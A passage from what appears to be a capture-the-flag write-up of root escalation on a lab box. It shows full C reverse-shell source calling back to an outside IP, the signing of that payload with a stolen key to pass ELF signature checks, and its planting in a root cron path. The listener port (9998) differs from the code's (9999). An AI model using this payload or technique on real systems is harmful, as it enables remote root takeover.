  0x00000080 09011610 79757269 76696368 40657261 ....yurivich@era
  0x00000090 2e636f6d 02146d63 4aa981e1 93a1e448 .com..mcJ......H
  0x000000a0 c5205ff7 9b84e6b6 f50b300b 06096086 . _.......0...`.
  0x000000b0 48016503 04020130 0d06092a 864886f7 H.e....0...*.H..
  0x000000c0 0d010101 05000482 01006a8d 5090e77a ..........j.P..z
  0x000000d0 a22431d3 e629241a c7eec906 dce87592 .$1..)$.......u.
  0x000000e0 c90733b8 5ea5c466 db04a35a 28648853 ..3.^..f...Z(d.S
  0x000000f0 00f2775c fbe983ae 833d2c36 7030985a ..w\.....=,6p0.Z
  0x00000100 b5d9ae28 cfbf75db 8e402955 c9bef8d3 ...(..u..@)U....
  0x00000110 058e6ee1 1eb435bb 30a3056d b85074bc ..n...5.0..m.Pt.
  0x00000120 4e15fc44 0a57e3f6 2f4b5ecd 0e6b222d N..D.W../K^..k"-
  0x00000130 c4039189 2c7ded05 fe45a3e9 c00f0610 ....,}...E......
  0x00000140 f8a653ab f72571aa cbf2ff38 238658d0 ..S..%q....8#.X.
  0x00000150 8dcfba33 1c6d2092 8c01c77d 4e49ea94 ...3.m ....}NI..
  0x00000160 670c9de9 42779e09 67143d81 49209fc1 g...Bw..g.=.I ..
  0x00000170 24005880 04c7cebf d398ec6d 55b50333 $.X........mU..3
  0x00000180 db46f2ab 74e6aa24 e9dc76d2 c9c4183b .F..t..$..v....;
  0x00000190 991bc0f4 762b1c09 1d82317c aab31e88 ....v+....1|....
  0x000001a0 dfc04871 2bb9ac8a 0dbb6cd7 cd6bdcaa ..Hq+.....l..k..
  0x000001b0 c96c2afe faa17944 ebdd7a6e 6f2e91da .l*...yD..zno...
  0x000001c0 5e41e0e6 5ddeec93 47ee              ^A..]...G.
```
I could have used msfvenom here, but it had failed before, so instead I took a C [revshell](https://www.revshells.com/) to compile on the remote box. I could have compiled this locally as well and statically linked everything but did'nt realize I could do that at this time of the step.
```sh
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 9999;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.81");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execvp("/bin/bash", argv);

    return 0;       
}
```
I spun my wheels with github copilot for a while, trying to figure out how to sign an ELF. Ultimately I was just led astray using `objcopy` and `openssl`, so I went to sleep and came back to this the next day.

With some internet grepping of the signature `.text_sig` and knowing I was looking for elf signing, I found https://github.com/NUAA-WatchDog/linux-elf-binary-signer/tree/master which had a readme output that looked almost exactly like what I had seen with the `readelf` from the day before.

I did need to compile this locally because it required `libssl-dev` which wasn't on the remote system:
```sh
gcc elf_sign.c -o elf_sign -lssl -lcrypto -static
```

But witht his new elf_sign binary compiled and copied over to the remote server, i could sign the malicious payload with the private key, the same private key to use as the cert, and my compiled `monitor` binary that is actually my reverse shell.

```sh
eric@era:~/monitordir$ ./elf_sign sha256 key.pem key.pem monitor
./elf_sign sha256 key.pem key.pem monitor
 --- 64-bit ELF file, version 1 (CURRENT), little endian.
 --- 31 sections detected.
 --- [Library dependency]: libc.so.6
 --- Section 0016 [.text] detected.
 --- Length of section [.text]: 466
 --- Signature size of [.text]: 458
 --- Writing signature to file: .text_sig
 --- Removing temporary signature file: .text_sig
eric@era:~/monitordir$ read -x .text_sig monitor
read -x .text_sig monitor
bash: read: -x: invalid option
read: usage: read [-ers] [-a array] [-d delim] [-i text] [-n nchars] [-N nchars] [-p prompt] [-t timeout] [-u fd] [name ...]
eric@era:~/monitordir$ readelf -x .text_sig monitor
readelf -x .text_sig monitor

Hex dump of section '.text_sig':
  0x00000000 308201c6 06092a86 4886f70d 010702a0 0.....*.H.......
  0x00000010 8201b730 8201b302 0101310d 300b0609 ...0......1.0...
  0x00000020 60864801 65030402 01300b06 092a8648 `.H.e....0...*.H
  0x00000030 86f70d01 07013182 01903082 018c0201 ......1...0.....
  0x00000040 01306730 4f311130 0f060355 040a0c08 .0g0O1.0...U....
  0x00000050 45726120 496e632e 31193017 06035504 Era Inc.1.0...U.
  0x00000060 030c1045 4c462076 65726966 69636174 ...ELF verificat
  0x00000070 696f6e31 1f301d06 092a8648 86f70d01 ion1.0...*.H....
  0x00000080 09011610 79757269 76696368 40657261 ....yurivich@era
  0x00000090 2e636f6d 02146d63 4aa981e1 93a1e448 .com..mcJ......H
  0x000000a0 c5205ff7 9b84e6b6 f50b300b 06096086 . _.......0...`.
  0x000000b0 48016503 04020130 0d06092a 864886f7 H.e....0...*.H..
  0x000000c0 0d010101 05000482 010063ae bc8c6f64 ..........c...od
  0x000000d0 357a8cec 4e7dc041 96ca5d91 ae5972c7 5z..N}.A..]..Yr.
  0x000000e0 d3eaf55e 41f95176 129536cd 0484ad57 ...^A.Qv..6....W
  0x000000f0 5f20d9df cefa15e7 46d6b3f8 9cf079e1 _ ......F.....y.
  0x00000100 a60157a4 0f4ca6cb f0bcfe3c 7fd192bc ..W..L.....<....
  0x00000110 fe1df718 eac4da05 09cbd8b3 bc371c64 .............7.d
  0x00000120 136fbe78 162f8dec d0f8f461 c25cfd27 .o.x./.....a.\.'
  0x00000130 a451c34f 55a409dc 19fd5cf0 35338adf .Q.OU.....\.53..
  0x00000140 b10c9f09 e74d1158 f44a4509 e57dd3bd .....M.X.JE..}..
  0x00000150 fa5af1a6 c40b8361 a49a82a1 58d43753 .Z.....a....X.7S
  0x00000160 83f594d7 facbec8b a3829533 d874eff7 ...........3.t..
  0x00000170 55206b4f 4c40894a b4a8400f f4b2a449 U kOL@.J..@....I
  0x00000180 3c42ef77 232e8ab7 24aab5cf e911bcd6 <B.w#...$.......
  0x00000190 de374a6f f49273e4 f0cc1705 ba60e845 .7Jo..s......`.E
  0x000001a0 77b9006c fbeddb94 6b3b9059 85e5dceb w..l....k;.Y....
  0x000001b0 3951ae59 9b580d18 d806c69f 34efce15 9Q.Y.X......4...
  0x000001c0 fc1c65d2 1624d5f7 b444              ..e..$...D

  eric@era:~/monitordir$ cp monitor /opt/AV/periodic-checks/monitor
cp monitor /opt/AV/periodic-checks/monitor
eric@era:~/monitordir$ cd /opt/AV/periodic-checks
cd /opt/AV/periodic-checksl
eric@era:/opt/AV/periodic-checks$ s -alhn
ls -alhn
total 32K
drwxrwxr-- 2 0 1001 4.0K Jul 27 14:30 .
drwxrwxr-- 3 0 1001 4.0K Jul 22 08:42 ..
-rwxrwxr-x 1 0 1001  17K Jul 27 14:30 monitor
-rw-rw---- 1 0 1001  103 Jul 27 14:30 status.log
```

Now with my shell ready to catch the connection, I wait for a bit and root cron delivers me unto valhalla.

```sh
 nc -lvn 9998
Listening on 0.0.0.0 9998
Connection received on 10.129.19.197 40256
whoami
root
cat /root/root.txt
b7d4898e3332392f7dde3d8c35c1a027
```
